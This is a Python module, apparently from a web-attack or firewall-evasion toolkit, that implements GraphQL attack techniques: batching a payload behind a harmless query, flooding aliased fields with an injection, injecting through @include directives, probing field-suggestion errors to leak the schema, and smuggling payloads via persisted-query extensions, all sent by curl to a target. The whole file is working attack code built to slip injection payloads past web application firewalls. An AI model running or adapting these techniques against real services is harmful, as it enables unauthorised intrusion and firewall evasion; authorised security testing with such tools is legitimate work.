"""GraphQL attack techniques — batching bypass, alias flood, directive injection."""
from __future__ import annotations

import json
from dataclasses import dataclass
from typing import Optional

from ..core.oracle import Target


@dataclass
class GQLAttackResult:
    technique: str
    code: str
    body: str
    waf_blocked: bool
    payload_used: str


def _send(target: Target, body_str: str, sender=None) -> tuple[str, str]:
    import subprocess
    url = target.url()
    cmd = ["curl", target.curl_sec(), "-m", str(target.timeout),
           "-w", "\n%{http_code}", "-A", target.user_agent,
           "-X", "POST", url,
           "-H", "Content-Type: application/json",
           "-d", body_str]
    for h in target.extra_headers:
        cmd += ["-H", h]
    if target.cookie:
        cmd += ["-b", target.cookie]
    try:
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=target.timeout + 5)
        lines = out.stdout.rsplit("\n", 1)
        resp_body = lines[0] if len(lines) > 1 else out.stdout
        code = lines[-1].strip().split()[0] if lines else "000"
        return code, resp_body
    except Exception:
        return "000", ""


def batch_bypass(target: Target, payload: str, safe_query: str = "{ __typename }",
                 sender=None) -> GQLAttackResult:
    """Send payload via GraphQL batching — WAF may inspect only first query."""
    batch = [
        {"query": safe_query},
        {"query": f'{{ search(q: {json.dumps(payload)}) {{ id }} }}'},
    ]
    body = json.dumps(batch)
    code, resp = _send(target, body, sender=sender)
    blocked = target.block_signature in resp
    return GQLAttackResult("batch_bypass", code, resp, blocked, payload)


def alias_flood(target: Target, payload: str, n: int = 50,
                sender=None) -> GQLAttackResult:
    """Use query aliases to repeat injection N times. WAF may have per-field limits."""
    fields = " ".join(
        f'a{i}: search(q: {json.dumps(payload)}) {{ id }}'
        for i in range(n)
    )
    query = f"{{ {fields} }}"
    body = json.dumps({"query": query})
    code, resp = _send(target, body, sender=sender)
    blocked = target.block_signature in resp
    return GQLAttackResult("alias_flood", code, resp, blocked, payload)


def directive_injection(target: Target, payload: str,
                        sender=None) -> GQLAttackResult:
    """Inject via @include/@skip directive arguments."""
    query = (
        f'{{ search(q: "test") @include(if: {json.dumps(payload)}) {{ id }} }}'
    )
    body = json.dumps({"query": query})
    code, resp = _send(target, body, sender=sender)
    blocked = target.block_signature in resp
    return GQLAttackResult("directive_injection", code, resp, blocked, payload)


def field_suggestion_leak(target: Target, sender=None) -> GQLAttackResult:
    """Probe for field-suggestion errors that leak schema info."""
    query = '{ __nonexistent_field_xyz }'
    body = json.dumps({"query": query})
    code, resp = _send(target, body, sender=sender)
    blocked = target.block_signature in resp
    has_suggestion = "Did you mean" in resp or "suggestions" in resp.lower()
    return GQLAttackResult(
        "field_suggestion_leak", code,
        resp if has_suggestion else "(no suggestions in response)",
        blocked, query)


def persisted_query_bypass(target: Target, payload: str,
                           sender=None) -> GQLAttackResult:
    """Try automatic persisted query (APQ) with payload in extensions."""
    import hashlib
    query = f'{{ search(q: {json.dumps(payload)}) {{ id }} }}'
    sha = hashlib.sha256(query.encode()).hexdigest()
    body = json.dumps({
        "extensions": {
            "persistedQuery": {"version": 1, "sha256Hash": sha}
        },
        "variables": {},
    })
    code, resp = _send(target, body, sender=sender)
    blocked = target.block_signature in resp
    return GQLAttackResult("persisted_query_bypass", code, resp, blocked, payload)
